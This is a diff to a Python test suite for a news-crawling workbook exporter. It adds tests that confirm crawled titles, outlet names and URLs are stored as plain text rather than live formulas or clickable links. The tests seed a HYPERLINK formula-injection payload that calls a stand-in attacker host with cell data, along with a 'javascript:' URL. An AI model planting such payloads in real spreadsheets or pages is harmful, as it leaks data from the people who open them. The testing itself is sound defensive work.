@@ -288,7 +288,7 @@ class TestRowNumbering:
                 for row in range(workbook.FIRST_DATA_ROW, sheet.max_row + 1)
             ]
             ids = [value for value in ids if value not in (None, "")]
-            assert ids == [str(n) for n in range(1, len(ids) + 1)], (
+            assert ids == list(range(1, len(ids) + 1)), (
                 f"{path.name} is numbered {ids}, not 1..N"
             )
 
@@ -300,7 +300,7 @@ class TestRowNumbering:
         target = workbook.build_workbook(workbook.rows()[1:], tmp_path / "slice.xlsx")
 
         sheet = load_workbook(target)[workbook.SHEET]
-        assert sheet.cell(workbook.FIRST_DATA_ROW, 1).value == "1"
+        assert sheet.cell(workbook.FIRST_DATA_ROW, 1).value == 1
 
 
 class TestRebuildIsBounded:
@@ -373,3 +373,76 @@ class TestRebuildIsBounded:
         build_daily_workbook()
         feed = (tmp_path / "TXT Files" / "security_news.txt").read_text(encoding="utf-8")
         assert "تیتر بهینه‌شده" in feed
+
+
+class TestSpreadsheetInjection:
+    """A crawled headline must not become a live formula.
+
+    openpyxl types any string starting with `=` as a FORMULA, so the payload is inert
+    everywhere in this system except in the one artifact a human opens. Titles, leads and
+    outlet names come verbatim from third-party markup.
+    """
+
+    def _sheet(self, article, tmp_path, name):
+        target = workbook.build_workbook(workbook.rows(), tmp_path / name)
+        return load_workbook(target)[workbook.SHEET]
+
+    def test_a_headline_that_looks_like_a_formula_is_stored_as_text(
+        self, analysed, tmp_path
+    ):
+        payload = '=HYPERLINK("http://evil.test/?x="&A2,"مشاهده خبر")'
+        article = analysed()
+        Article.objects.filter(pk=article.pk).update(original_title=payload)
+        Summary.objects.filter(article=article).delete()
+
+        sheet = self._sheet(article, tmp_path, "title.xlsx")
+        cell = sheet.cell(workbook.FIRST_DATA_ROW, workbook.HEADERS.index("تیتر خبر") + 1)
+        assert cell.data_type == "s", "a crawled title must never be typed as a formula"
+        assert cell.value == payload, "and the text itself must survive unchanged"
+
+    def test_an_outlet_name_is_stored_as_text_too(self, analysed, tmp_path):
+        """Every value column, not just the title - the outlet is equally third-party."""
+        article = analysed()
+        Article.objects.filter(pk=article.pk).update(original_outlet="=1+1")
+
+        sheet = self._sheet(article, tmp_path, "outlet.xlsx")
+        cell = sheet.cell(workbook.FIRST_DATA_ROW, workbook.HEADERS.index("منبع") + 1)
+        assert cell.data_type == "s"
+
+    def test_the_notify_column_is_still_a_real_formula(self, analysed, tmp_path):
+        """The guard must not disarm the one formula that is supposed to be there - it is
+        what keeps the sheet from voting differently from `decide()`."""
+        analysed()
+        sheet = self._sheet(None, tmp_path, "notify.xlsx")
+        cell = sheet.cell(
+            workbook.FIRST_DATA_ROW, workbook.HEADERS.index(workbook.NOTIFY_HEADER) + 1
+        )
+        assert cell.data_type == "f"
+
+    def test_a_non_http_url_is_not_turned_into_a_clickable_link(self, analysed, tmp_path):
+        """`urljoin` resolves `javascript:...` to itself, and `quality_reason` records
+        `invalid_url` as a flag without stopping the row reaching the workbook."""
+        article = analysed()
+        Article.objects.filter(pk=article.pk).update(url="javascript:alert(1)")
+
+        sheet = self._sheet(article, tmp_path, "link.xlsx")
+        cell = sheet.cell(workbook.FIRST_DATA_ROW, workbook.HEADERS.index("لینک") + 1)
+        assert cell.hyperlink is None
+        assert cell.value == "javascript:alert(1)", "still shown, just not clickable"
+
+    def test_an_ordinary_link_is_still_a_hyperlink(self, analysed, tmp_path):
+        analysed()
+        sheet = self._sheet(None, tmp_path, "ok-link.xlsx")
+        cell = sheet.cell(workbook.FIRST_DATA_ROW, workbook.HEADERS.index("لینک") + 1)
+        assert cell.hyperlink is not None
+
+
+class TestIdColumnIsNumeric:
+    def test_the_id_is_a_number_not_a_string(self, analysed, tmp_path):
+        """All 40 of the team's workbooks store an integer in «شناسه خبر». A numeric-looking
+        string renders left-aligned as text and does not sort as a number."""
+        analysed()
+        target = workbook.build_workbook(workbook.rows(), tmp_path / "id.xlsx")
+        cell = load_workbook(target)[workbook.SHEET].cell(workbook.FIRST_DATA_ROW, 1)
+        assert cell.value == 1
+        assert isinstance(cell.value, int)
